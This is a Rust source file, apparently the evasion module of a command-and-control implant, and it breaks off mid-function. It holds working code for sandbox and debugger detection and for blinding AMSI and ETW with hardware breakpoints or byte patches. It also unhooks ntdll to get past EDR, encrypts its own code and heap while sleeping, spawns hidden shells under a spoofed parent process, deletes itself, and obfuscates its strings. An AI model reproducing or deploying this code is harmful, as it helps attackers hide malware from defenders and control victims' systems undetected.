//! Evasion monitor — pre-flight and in-loop checks.
//!
//! abort_if_sandboxed() runs once at startup. should_abort() runs every loop iteration.
//! Both return true if the agent should silently exit without doing anything.

const NO_EVASION: bool = {
    let b = env!("DM_NO_EVASION").as_bytes();
    b.len() == 4 && b[0] == b't' && b[1] == b'r' && b[2] == b'u' && b[3] == b'e'
};

const SLEEP_ENCRYPT: bool = match option_env!("DM_SLEEP_ENCRYPT") {
    Some(v) => {
        let b = v.as_bytes();
        b.len() == 4 && b[0] == b't' && b[1] == b'r' && b[2] == b'u' && b[3] == b'e'
    }
    None => false,
};

/// abort_if_sandboxed runs before registration.
/// Returns true if the environment looks like a sandbox or analysis VM.
pub fn abort_if_sandboxed() -> bool {
    if NO_EVASION { return false; }
    #[cfg(target_os = "windows")]
    {
        if is_sandbox_artifact_present() { return true; }
        if is_suspicious_process_count() { return true; }
        if is_uptime_too_short()         { return true; }
    }
    false
}

/// should_abort runs every poll loop iteration.
/// Returns true if the environment changed in a way that suggests detection.
pub fn should_abort() -> bool {
    if NO_EVASION { return false; }
    #[cfg(target_os = "windows")]
    {
        if is_debugger_present()      { return true; }
        if is_analysis_tool_running() { return true; }
    }
    false
}

/// startup_patches applies all compile-time-selected evasion patches before the
/// agent contacts the C2. Order matters:
///   1. unhook — restores clean ntdll .text so later patches hit unhooked stubs
///   2. etw-patch / amsi-patch — via HWBP-VEH (preferred, zero bytes written to
///      ntdll/amsi.dll) or byte-patch fallback
///   3. stack-spoof init — scan ntdll for ret gadget (needs clean ntdll)
pub fn startup_patches() {
    // unhook_ntdll is intentionally NOT called here — we use indirect syscalls (Hell's Gate)
    // to bypass user-land EDR hooks without touching ntdll .text, which triggers BD kernel
    // callbacks. The unhook feature still compiles but is invoked separately if needed.

    #[cfg(target_os = "windows")]
    {
        // Resolve both target addresses once so we can arm HWBP for either/both.
        #[allow(unused_assignments, unused_mut)]
        let mut amsi_addr: u64 = 0;
        #[allow(unused_assignments, unused_mut)]
        let mut etw_addr: u64  = 0;

        #[cfg(feature = "amsi-patch")]
        {
            use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
            unsafe {
                let s_amsi = crate::obfs::dec(&[0x3B,0x37,0x29,0x33,0x74,0x3E,0x36,0x36,0x5A]);
                let s_asb  = crate::obfs::dec(&[0x1B,0x37,0x29,0x33,0x09,0x39,0x3B,0x34,0x18,0x2F,0x3C,0x3C,0x3F,0x28,0x5A]);
                let h = {
                    let h = GetModuleHandleA(s_amsi.as_ptr());
                    if h != 0 { h } else { LoadLibraryA(s_amsi.as_ptr()) }
                };
                if h != 0 {
                    if let Some(p) = GetProcAddress(h, s_asb.as_ptr()) {
                        amsi_addr = p as u64;
                    }
                }
            }
        }

        #[cfg(feature = "etw-patch")]
        {
            use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
            unsafe {
                let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
                let s_etw   = crate::obfs::dec(&[0x1F,0x2E,0x2D,0x1F,0x2C,0x3F,0x34,0x2E,0x0D,0x28,0x33,0x2E,0x3F,0x5A]);
                let h = GetModuleHandleA(s_ntdll.as_ptr());
                if h != 0 {
                    if let Some(p) = GetProcAddress(h, s_etw.as_ptr()) {
                        etw_addr = p as u64;
                    }
                }
            }
        }

        // If we have at least one address, try HWBP-VEH first (no bytes written to DLLs).
        // Fall back to byte-patch if HWBP setup fails.
        if amsi_addr != 0 || etw_addr != 0 {
            let hwbp_ok = hwbp_setup(amsi_addr, etw_addr);
            if !hwbp_ok {
                #[cfg(feature = "etw-patch")]
                patch_etw();
                #[cfg(feature = "amsi-patch")]
                patch_amsi();
            }
        }
    }

    #[cfg(all(target_arch = "x86_64", feature = "stack-spoof"))]
    crate::syscall::init_stack_spoof();
}

/// cleanup removes any artifacts left by the agent before exiting.
/// Called when the server sends a kill signal.
pub fn cleanup() {
    #[cfg(all(target_os = "windows", feature = "self-delete"))]
    self_delete();
}

/// masked_sleep XOR-encrypts the session key and, when text bounds are known
/// from a UDRL staged load, also XOR-encrypts the agent .text section during
/// sleep so memory scanners see no recognisable code at rest.
///
/// .text encryption safety: the 2 pages that contain this function itself are
/// always excluded from the XOR so the encrypt/sleep/decrypt loop never runs
/// from XOR'd bytes. Sleep is issued via the Win32 Sleep() import (kernel32),
/// so no agent .text is needed while the thread is blocked.
///
/// Skipped entirely when DM_NO_EVASION=true or DM_SLEEP_ENCRYPT is not "true".
pub fn masked_sleep(duration: std::time::Duration, key: &mut [u8; 32]) {
    if NO_EVASION || !SLEEP_ENCRYPT {
        std::thread::sleep(duration);
        return;
    }

    let raw = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos()
        & 0xFF) as u8;
    let mask = if raw == 0 { 1u8 } else { raw };

    for b in key.iter_mut() { *b ^= mask; }

    #[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
    xor_heap(mask);

    // Step 5: XOR-encrypt .text during sleep if bounds were stored by reflect_pe.
    #[cfg(all(target_os = "windows", feature = "udrl"))]
    let text_encrypted = text_xor_sleep(duration, mask);
    #[cfg(all(target_os = "windows", feature = "udrl"))]
    if text_encrypted { /* sleep was handled inside text_xor_sleep */ } else { std::thread::sleep(duration); }
    #[cfg(not(all(target_os = "windows", feature = "udrl")))]
    std::thread::sleep(duration);

    #[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
    xor_heap(mask);

    for b in key.iter_mut() { *b ^= mask; }
}

/// XOR-encrypts .text (excluding the pages containing this function), sleeps,
/// then decrypts. Returns true if encryption was performed (sleep was handled
/// internally). Returns false if text bounds are unknown — caller must sleep.
#[cfg(all(target_os = "windows", feature = "udrl"))]
#[inline(always)]
fn text_xor_sleep(duration: std::time::Duration, mask: u8) -> bool {
    use core::sync::atomic::Ordering;
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE};
    use windows_sys::Win32::System::Threading::Sleep;

    let base = crate::loader::TEXT_BASE.load(Ordering::Relaxed) as *mut u8;
    let size = crate::loader::TEXT_SIZE.load(Ordering::Relaxed) as usize;
    if base.is_null() || size == 0 { return false; }

    // The 2 pages holding this function must never be XOR'd.
    // We use inline(always) so the code is inlined into masked_sleep's page range.
    let self_page0 = (masked_sleep as *const u8 as usize) & !0xFFF;
    let self_page1 = self_page0.wrapping_add(0x1000);

    // Make .text writable.
    let mut old_prot: u32 = 0;
    if unsafe { VirtualProtect(base as _, size, PAGE_READWRITE, &mut old_prot) } == 0 {
        return false;
    }

    // XOR all pages except the two containing this function.
    unsafe { xor_text_skip(base, size, mask, self_page0, self_page1) };

    // Sleep via kernel32 import — execution stays in kernel32/ntdll; no .text needed.
    let ms = duration.as_millis().min(u32::MAX as u128) as u32;
    unsafe { Sleep(ms) };

    // Decrypt by applying the same mask again (XOR is self-inverse).
    unsafe { xor_text_skip(base, size, mask, self_page0, self_page1) };

    // Restore execute permission.
    unsafe { VirtualProtect(base as _, size, PAGE_EXECUTE_READ, &mut old_prot) };

    true
}

#[cfg(all(target_os = "windows", feature = "udrl"))]
#[inline(always)]
unsafe fn xor_text_skip(base: *mut u8, size: usize, mask: u8, skip0: usize, skip1: usize) {
    let mut off = 0usize;
    while off < size {
        let page_addr = base as usize + off;
        let page_size = 0x1000.min(size - off);
        if page_addr != skip0 && page_addr != skip1 {
            let slice = core::slice::from_raw_parts_mut(base.add(off), page_size);
            for b in slice { *b ^= mask; }
        }
        off += page_size;
    }
}

// ---------------------------------------------------------------------------
// Windows-specific checks
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
fn is_debugger_present() -> bool {
    use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
    unsafe { IsDebuggerPresent() != 0 }
}

#[cfg(target_os = "windows")]
fn is_sandbox_artifact_present() -> bool {
    use crate::obfs::dec_str;
    let username = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    // Sandbox-typical usernames — stored XOR'd so they never appear as plaintext
    let sandbox_users = [
        dec_str(&[0x29,0x3B,0x34,0x3E,0x38,0x35,0x22]),       // "sandbox"
        dec_str(&[0x3B,0x34,0x3B,0x36,0x23,0x29,0x2E]),        // "analyst"
        dec_str(&[0x37,0x3B,0x36,0x2E,0x3F,0x29,0x2E]),        // "maltest"
        dec_str(&[0x2E,0x3F,0x29,0x2E]),                        // "test"
        dec_str(&[0x2C,0x33,0x28,0x2F,0x29]),                   // "virus"
        dec_str(&[0x3B,0x2C]),                                   // "av"
        dec_str(&[0x37,0x3B,0x36,0x2D,0x3B,0x28,0x3F]),        // "malware"
    ];
    if sandbox_users.iter().any(|u| username.contains(u.as_str())) {
        return true;
    }

    let hostname = std::env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();
    let sandbox_hosts = [
        dec_str(&[0x29,0x3B,0x34,0x3E,0x38,0x35,0x22]),        // "sandbox"
        dec_str(&[0x3B,0x34,0x3B,0x36,0x23,0x29,0x33,0x29]),   // "analysis"
        dec_str(&[0x2C,0x33,0x28,0x2F,0x29]),                   // "virus"
        dec_str(&[0x37,0x3B,0x36,0x2D,0x3B,0x28,0x3F]),        // "malware"
        dec_str(&[0x39,0x2F,0x39,0x31,0x35,0x35]),              // "cuckoo"
    ];
    if sandbox_hosts.iter().any(|h| hostname.contains(h.as_str())) {
        return true;
    }

    false
}

#[cfg(target_os = "windows")]
pub(crate) fn enum_process_names() -> Vec<String> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    let mut names = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return names;
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                names.push(String::from_utf16_lossy(&entry.szExeFile[..len]).to_lowercase());
                if Process32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    names
}

#[cfg(target_os = "windows")]
fn is_suspicious_process_count() -> bool {
    enum_process_names().len() < 30
}

#[cfg(target_os = "windows")]
fn is_uptime_too_short() -> bool {
    // Sandboxes are often freshly booted; uptime < 5 min is suspicious
    use windows_sys::Win32::System::SystemInformation::GetTickCount64;
    let uptime_ms = unsafe { GetTickCount64() };
    uptime_ms < 5 * 60 * 1000
}

#[cfg(target_os = "windows")]
fn is_analysis_tool_running() -> bool {
    // DJB2 hashes of analysis tool names (all lowercase) — no tool name string
    // appears in the binary; only the u32 hashes are embedded.
    const fn djb2(s: &[u8]) -> u32 { crate::obfs::djb2(s) }
    const TOOL_HASHES: &[u32] = &[
        djb2(b"wireshark.exe"),
        djb2(b"procmon.exe"),
        djb2(b"procmon64.exe"),
        djb2(b"processhacker.exe"),
        djb2(b"x64dbg.exe"),
        djb2(b"x32dbg.exe"),
        djb2(b"ollydbg.exe"),
        djb2(b"ida.exe"),
        djb2(b"ida64.exe"),
        djb2(b"idag.exe"),
        djb2(b"idat.exe"),
        djb2(b"autoruns.exe"),
        djb2(b"autoruns64.exe"),
        djb2(b"fiddler.exe"),
        djb2(b"burpsuite.exe"),
        djb2(b"dnspy.exe"),
        djb2(b"dotpeek64.exe"),
    ];
    enum_process_names()
        .iter()
        .any(|n| TOOL_HASHES.contains(&djb2(n.as_bytes())))
}

// ── Phase 3 evasion primitives ────────────────────────────────────────────────

// ---------------------------------------------------------------------------
// Step 2: PPID-spoofed shell spawner
// Spawns cmd.exe /C <cmd> with CREATE_NO_WINDOW under an explorer.exe parent
// so the child process tree doesn't point back to the agent.
// ---------------------------------------------------------------------------

/// Spawn a shell command with PPID spoofing and return combined stdout+stderr.
#[cfg(all(target_os = "windows", feature = "ppid-spoof"))]
pub fn spawn_shell_spoofed(cmd: &str) -> Result<Vec<u8>, &'static str> {
    use windows_sys::Win32::Foundation::{CloseHandle, FALSE, INVALID_HANDLE_VALUE, HANDLE};
    use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
    use windows_sys::Win32::Storage::FileSystem::ReadFile;
    use windows_sys::Win32::System::Pipes::CreatePipe;
    use windows_sys::Win32::System::Threading::{
        CreateProcessW, InitializeProcThreadAttributeList, OpenProcess,
        UpdateProcThreadAttribute, WaitForSingleObject,
        EXTENDED_STARTUPINFO_PRESENT, PROCESS_INFORMATION, STARTUPINFOEXW,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, STARTF_USESTDHANDLES,
        DeleteProcThreadAttributeList,
    };

    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    const PROCESS_CREATE_PROCESS: u32 = 0x0080;
    const INFINITE: u32 = 0xFFFF_FFFF;

    // Prefer explorer.exe as the spoofed parent; fall back to winlogon.exe
    let parent_pid = find_pid_by_name("explorer.exe")
        .or_else(|| find_pid_by_name("winlogon.exe"))
        .ok_or("no suitable ppid spoof parent found")?;

    let parent = unsafe { OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid) };
    if parent == 0 || parent == INVALID_HANDLE_VALUE {
        return Err("OpenProcess for ppid spoof failed");
    }

    // Inheritable SECURITY_ATTRIBUTES for the stdout pipe write end.
    let sa = SECURITY_ATTRIBUTES {
        nLength:              core::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        lpSecurityDescriptor: core::ptr::null_mut(),
        bInheritHandle:       1,
    };

    let (mut rd, mut wr): (HANDLE, HANDLE) = (0, 0);
    if unsafe { CreatePipe(&mut rd, &mut wr, &sa, 0) } == 0 {
        unsafe { CloseHandle(parent) };
        return Err("CreatePipe failed");
    }

    // Make the read end non-inheritable so the child doesn't hold it open.
    extern "system" { fn SetHandleInformation(h: HANDLE, mask: u32, flags: u32) -> i32; }
    unsafe { SetHandleInformation(rd, 1 /*HANDLE_FLAG_INHERIT*/, 0); }

    // Build the proc-thread attribute list for PPID override.
    let mut attr_size: usize = 0;
    unsafe { InitializeProcThreadAttributeList(core::ptr::null_mut(), 1, 0, &mut attr_size) };
    if attr_size == 0 {
        unsafe { CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
        return Err("InitializeProcThreadAttributeList sizing failed");
    }
    let mut attr_buf = vec![0u8; attr_size];
    let attr_list = attr_buf.as_mut_ptr() as *mut _;
    if unsafe { InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size) } == 0 {
        unsafe { CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
        return Err("InitializeProcThreadAttributeList init failed");
    }
    let mut parent_val: HANDLE = parent;
    if unsafe {
        UpdateProcThreadAttribute(
            attr_list, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            &mut parent_val as *mut HANDLE as *mut _,
            core::mem::size_of::<HANDLE>(),
            core::ptr::null_mut(), core::ptr::null_mut(),
        )
    } == 0 {
        unsafe { DeleteProcThreadAttributeList(attr_list); CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
        return Err("UpdateProcThreadAttribute failed");
    }

    // Redirect stdout + stderr to the write end of our pipe.
    let mut si: STARTUPINFOEXW = unsafe { core::mem::zeroed() };
    si.StartupInfo.cb        = core::mem::size_of::<STARTUPINFOEXW>() as u32;
    si.StartupInfo.dwFlags   = STARTF_USESTDHANDLES;
    si.StartupInfo.hStdInput  = INVALID_HANDLE_VALUE;
    si.StartupInfo.hStdOutput = wr;
    si.StartupInfo.hStdError  = wr;
    si.lpAttributeList        = attr_list;

    let cmdline = format!("cmd.exe /C {cmd}");
    let mut cmdline_w: Vec<u16> = cmdline.encode_utf16().chain(core::iter::once(0)).collect();

    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
    let ok = unsafe {
        CreateProcessW(
            core::ptr::null(),
            cmdline_w.as_mut_ptr(),
            core::ptr::null_mut(), core::ptr::null_mut(),
            1, // bInheritHandles = TRUE so write pipe is passed to child
            CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
            core::ptr::null_mut(), core::ptr::null_mut(),
            &mut si.StartupInfo,
            &mut pi,
        )
    };

    unsafe {
        DeleteProcThreadAttributeList(attr_list);
        CloseHandle(wr); // child holds it; close our copy so ReadFile gets EOF
        CloseHandle(parent);
    }

    if ok == 0 {
        unsafe { CloseHandle(rd) };
        return Err("CreateProcessW (spoofed) failed");
    }

    // Drain the pipe until the child exits.
    let mut out = Vec::new();
    let mut buf = [0u8; 4096];
    loop {
        let mut n: u32 = 0;
        if unsafe { ReadFile(rd, buf.as_mut_ptr(), buf.len() as u32, &mut n, core::ptr::null_mut()) } == 0
            || n == 0 { break; }
        out.extend_from_slice(&buf[..n as usize]);
    }
    unsafe {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(rd);
    }
    Ok(out)
}

/// Find the first PID whose exe name (case-insensitive) matches `name`.
#[cfg(all(target_os = "windows", feature = "ppid-spoof"))]
fn find_pid_by_name(name: &str) -> Option<u32> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    let lower = name.to_ascii_lowercase();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE { return None; }
        let mut e: PROCESSENTRY32W = core::mem::zeroed();
        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let n = String::from_utf16_lossy(&e.szExeFile[..nlen]).to_ascii_lowercase();
                if n == lower { CloseHandle(snap); return Some(e.th32ProcessID); }
                e = core::mem::zeroed();
                e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32NextW(snap, &mut e) == 0 { break; }
            }
        }
        CloseHandle(snap);
    }
    None
}

// ---------------------------------------------------------------------------
// Step 4: Hardware-breakpoint VEH for AMSI / ETW
// Sets DR0 = AmsiScanBuffer, DR1 = EtwEventWrite via NtSetContextThread,
// then intercepts EXCEPTION_SINGLE_STEP in a VEH to redirect execution
// without writing any bytes to ntdll/amsi.dll.
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
static HWBP_DR0: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
#[cfg(target_os = "windows")]
static HWBP_DR1: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);

/// Register the HWBP VEH and arm DR0 (AMSI) + DR1 (ETW) on the current thread.
/// Returns true if setup succeeded; callers should fall back to byte-patching on false.
#[cfg(target_os = "windows")]
pub fn hwbp_setup(amsi_addr: u64, etw_addr: u64) -> bool {
    use windows_sys::Win32::System::Diagnostics::Debug::{
        AddVectoredExceptionHandler, CONTEXT,
    };
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    // ContextFlags value for debug registers on AMD64
    const CONTEXT_DEBUG_REGISTERS: u32 = 0x0010_0010;

    HWBP_DR0.store(amsi_addr, core::sync::atomic::Ordering::Relaxed);
    HWBP_DR1.store(etw_addr,  core::sync::atomic::Ordering::Relaxed);

    // Register VEH (first in chain = highest priority)
    let handler = unsafe { AddVectoredExceptionHandler(1, Some(veh_hwbp)) };
    if handler.is_null() { return false; }

    // Set DR0/DR1 on the current thread via NtSetContextThread(-2 = current thread).
    // GetThreadContext/SetThreadContext reject the current-thread pseudo-handle;
    // NtSetContextThread accepts it.
    unsafe {
        let ntdll = GetModuleHandleA(crate::obfs::dec(
            &[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]).as_ptr());
        if ntdll == 0 { return false; }

        type NtGetCtx = unsafe extern "system" fn(isize, *mut CONTEXT) -> i32;
        type NtSetCtx = unsafe extern "system" fn(isize, *const CONTEXT) -> i32;

        let get_fn = match GetProcAddress(ntdll, b"NtGetContextThread\0".as_ptr()) {
            Some(f) => core::mem::transmute::<_, NtGetCtx>(f),
            None    => return false,
        };
        let set_fn = match GetProcAddress(ntdll, b"NtSetContextThread\0".as_ptr()) {
            Some(f) => core::mem::transmute::<_, NtSetCtx>(f),
            None    => return false,
        };

        const NT_CURRENT_THREAD: isize = -2;
        let mut ctx: CONTEXT = core::mem::zeroed();
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if get_fn(NT_CURRENT_THREAD, &mut ctx) < 0 { return false; }

        ctx.Dr0 = amsi_addr;
        ctx.Dr1 = etw_addr;
        // DR7: L0 (bit 0) enables DR0, L1 (bit 2) enables DR1; both execute-break (type=00, len=00)
        ctx.Dr7 = (ctx.Dr7 & !0xFF) | 0x0005;

        set_fn(NT_CURRENT_THREAD, &ctx) >= 0
    }
}

/// VEH handler installed by hwbp_setup.
/// On DR0 (AmsiScanBuffer): set result = AMSI_RESULT_CLEAN, return S_OK.
/// On DR1 (EtwEventWrite): silent return (no event written).
#[cfg(target_os = "windows")]
unsafe extern "system" fn veh_hwbp(
    info: *mut windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS,
) -> i32 {
    const EXCEPTION_SINGLE_STEP:       i32 = 0x8000_0004u32 as i32;
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH:    i32 = 0;

    let rec = &*(*info).ExceptionRecord;
    if rec.ExceptionCode != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let ctx = &mut *(*info).ContextRecord;
    let dr6 = ctx.Dr6;
    ctx.Dr6 = 0; // clear status so the next breakpoint fires cleanly

    let rsp = ctx.Rsp as *const u64;

    if dr6 & 0x1 != 0 {
        // DR0 = AmsiScanBuffer
        // Prototype: HRESULT AmsiScanBuffer(ctx, buf, len, name, session, *result)
        // x64: args 1-4 in rcx/rdx/r8/r9; arg5=[rsp+0x28]; arg6=[rsp+0x30]
        let result_ptr = *rsp.add(6) as *mut u32;
        if !result_ptr.is_null() {
            *result_ptr = 0; // AMSI_RESULT_CLEAN
        }
        ctx.Rax = 0; // S_OK
        ctx.Rip = *rsp; // return to caller
        ctx.Rsp += 8;
        ctx.EFlags |= 0x0001_0000; // RF flag: suppress re-trigger on same RIP
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if dr6 & 0x2 != 0 {
        // DR1 = EtwEventWrite — silent return, event never written
        ctx.Rax = 0;
        ctx.Rip = *rsp;
        ctx.Rsp += 8;
        ctx.EFlags |= 0x0001_0000;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    EXCEPTION_CONTINUE_SEARCH
}

/// Patch EtwEventWrite in the in-memory ntdll with a `ret` stub so ETW-based
/// detections are blinded. The patch is applied in-process only.
#[cfg(all(target_os = "windows", feature = "etw-patch"))]
pub fn patch_etw() {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows_sys::Win32::System::Memory::VirtualProtect;

    unsafe {
        let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
        let s_etw   = crate::obfs::dec(&[0x1F,0x2E,0x2D,0x1F,0x2C,0x3F,0x34,0x2E,0x0D,0x28,0x33,0x2E,0x3F,0x5A]);
        let ntdll = GetModuleHandleA(s_ntdll.as_ptr());
        if ntdll == 0 { return; }
        let fn_ptr = match GetProcAddress(ntdll, s_etw.as_ptr()) {
            Some(p) => p as *mut u8,
            None => return,
        };
        let mut old_prot: u32 = 0;
        if VirtualProtect(fn_ptr as *const core::ffi::c_void, 1, 0x40, &mut old_prot) == 0 {
            return;
        }
        // Patch with `ret` (0xC3): EtwEventWrite returns immediately, writing nothing.
        *fn_ptr = 0xC3;
        VirtualProtect(fn_ptr as *const core::ffi::c_void, 1, old_prot, &mut old_prot);
    }
}

/// Patch AmsiScanBuffer in amsi.dll with a `mov eax, 0x80070057; ret` stub
/// so it returns E_INVALIDARG, causing the AMSI consumer to skip the scan.
/// amsi.dll may not be loaded in non-.NET hosts; that is acceptable.
#[cfg(all(target_os = "windows", feature = "amsi-patch"))]
pub fn patch_amsi() {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
    use windows_sys::Win32::System::Memory::VirtualProtect;

    // AMSI is a late-loaded DLL; load it if not yet mapped.
    unsafe {
        let s_amsi = crate::obfs::dec(&[0x3B,0x37,0x29,0x33,0x74,0x3E,0x36,0x36,0x5A]);
        let s_asb  = crate::obfs::dec(&[0x1B,0x37,0x29,0x33,0x09,0x39,0x3B,0x34,0x18,0x2F,0x3C,0x3C,0x3F,0x28,0x5A]);
        let amsi = {
            let h = GetModuleHandleA(s_amsi.as_ptr());
            if h != 0 { h } else { LoadLibraryA(s_amsi.as_ptr()) }
        };
        if amsi == 0 { return; }
        let fn_ptr = match GetProcAddress(amsi, s_asb.as_ptr()) {
            Some(p) => p as *mut u8,
            None => return,
        };
        let patch_enc: [u8; 6] = [0xE2, 0x0D, 0x5A, 0x5D, 0xDA, 0x99];
        let patch: [u8; 6] = patch_enc.map(|b| b ^ crate::obfs::KEY);
        let mut old_prot: u32 = 0;
        if VirtualProtect(fn_ptr as *const core::ffi::c_void, patch.len(), 0x40, &mut old_prot) == 0 {
            return;
        }
        core::ptr::copy_nonoverlapping(patch.as_ptr(), fn_ptr, patch.len());
        VirtualProtect(fn_ptr as *const core::ffi::c_void, patch.len(), old_prot, &mut old_prot);
    }
}

/// Restore ntdll.dll's .text section from the clean on-disk copy at
/// %SystemRoot%\System32\ntdll.dll, removing all userland EDR hooks.
///
/// Safety: we hold no ntdll locks during the copy. The write must be to the
/// executable image section in-memory, not to the file on disk.
#[cfg(all(target_os = "windows", feature = "unhook"))]
pub fn unhook_ntdll() {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    use windows_sys::Win32::System::Memory::VirtualProtect;

    unsafe {
        // Locate in-memory ntdll
        let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
        let ntdll_mem = GetModuleHandleA(s_ntdll.as_ptr()) as *const u8;
        if ntdll_mem.is_null() { return; }

        // Build path to on-disk ntdll
        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
        let path = format!("{}\\System32\\ntdll.dll", sysroot);

        // Read the on-disk copy
        let disk_bytes = match std::fs::read(&path) {
            Ok(b) => b,
            Err(_) => return,
        };
        if disk_bytes.len() < 64 { return; }

        // Parse the disk PE to find .text section
        let e_lfanew = u32::from_le_bytes([
            disk_bytes[0x3C], disk_bytes[0x3D], disk_bytes[0x3E], disk_bytes[0x3F],
        ]) as usize;
        if disk_bytes.len() < e_lfanew + 24 { return; }

        let num_sections = u16::from_le_bytes([
            disk_bytes[e_lfanew + 6], disk_bytes[e_lfanew + 7],
        ]) as usize;
        let opt_size = u16::from_le_bytes([
            disk_bytes[e_lfanew + 20], disk_bytes[e_lfanew + 21],
        ]) as usize;
        let sh_base = e_lfanew + 24 + opt_size;

        for i in 0..num_sections {
            let s = sh_base + i * 40;
            if disk_bytes.len() < s + 40 { break; }

            // Section name is 8 bytes at offset s; check for ".text\0\0\0"
            let name = &disk_bytes[s..s+8];
            let is_text = name.starts_with(b".text");
            if !is_text { continue; }

            let virt_rva = u32::from_le_bytes([
                disk_bytes[s+12], disk_bytes[s+13], disk_bytes[s+14], disk_bytes[s+15],
            ]) as usize;
            let virt_size = u32::from_le_bytes([
                disk_bytes[s+8],  disk_bytes[s+9],  disk_bytes[s+10], disk_bytes[s+11],
            ]) as usize;
            let raw_off = u32::from_le_bytes([
                disk_bytes[s+20], disk_bytes[s+21], disk_bytes[s+22], disk_bytes[s+23],
            ]) as usize;
            let raw_size = u32::from_le_bytes([
                disk_bytes[s+16], disk_bytes[s+17], disk_bytes[s+18], disk_bytes[s+19],
            ]) as usize;

            if raw_off + raw_size > disk_bytes.len() { break; }

            let copy_size = virt_size.min(raw_size);
            let target = ntdll_mem.add(virt_rva) as *mut u8;

            // Make the section writable, copy, restore permissions
            const PAGE_EXECUTE_READWRITE: u32 = 0x40;
            const PAGE_EXECUTE_READ:      u32 = 0x20;
            let mut old_prot: u32 = 0;
            if VirtualProtect(
                target as *const core::ffi::c_void,
                copy_size,
                PAGE_EXECUTE_READWRITE,
                &mut old_prot,
            ) == 0 { break; }

            core::ptr::copy_nonoverlapping(
                disk_bytes.as_ptr().add(raw_off),
                target,
                copy_size,
            );

            VirtualProtect(
                target as *const core::ffi::c_void,
                copy_size,
                PAGE_EXECUTE_READ,
                &mut old_prot,
            );
            break;
        }
    }
}

/// XOR-mask every live heap allocation with `key`.
/// Called twice (before and after sleep) to encrypt and then decrypt in place.
/// HeapLock prevents concurrent allocations from racing with our walk.
#[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
fn xor_heap(key: u8) {
    use windows_sys::Win32::System::Memory::{
        GetProcessHeap, HeapLock, HeapUnlock, HeapWalk, PROCESS_HEAP_ENTRY,
    };

    const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x0004;

    unsafe {
